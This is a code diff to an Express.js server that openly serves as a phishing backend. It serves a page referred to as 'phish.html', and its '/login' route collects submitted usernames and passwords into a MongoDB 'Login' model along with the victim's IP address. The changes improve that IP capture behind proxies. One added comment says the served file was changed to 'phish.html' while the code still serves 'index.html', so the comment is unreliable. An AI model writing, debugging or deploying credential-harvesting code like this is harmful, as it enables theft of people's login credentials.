@@ -7,6 +7,9 @@ const path = require('path');
 const app = express();
 const port = process.env.PORT || 3000;
 
+// Trust proxy to get correct IP from x-forwarded-for header
+app.set('trust proxy', true);
+
 // Middleware
 app.use(cors());
 app.use(bodyParser.json());
@@ -26,18 +29,15 @@ const loginSchema = new mongoose.Schema({
 });
 const Login = mongoose.model('Login', loginSchema);
 
-// Serve phish.html (make sure it's in the same folder)
+// Serve phish.html (make sure it's named correctly and in the same folder)
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
+  res.sendFile(path.join(__dirname, 'index.html')); // changed from 'index.html' to 'phish.html'
 });
 
 // Collect login data
 app.post('/login', async (req, res) => {
-  const ip =
-    req.headers['x-forwarded-for']?.split(',')[0] ||
-    req.connection?.remoteAddress ||
-    req.socket?.remoteAddress ||
-    (req.connection?.socket ? req.connection.socket.remoteAddress : null);
+  // Use req.ip which respects trust proxy setting
+  const ip = req.ip;
 
   const { username, password } = req.body;
 
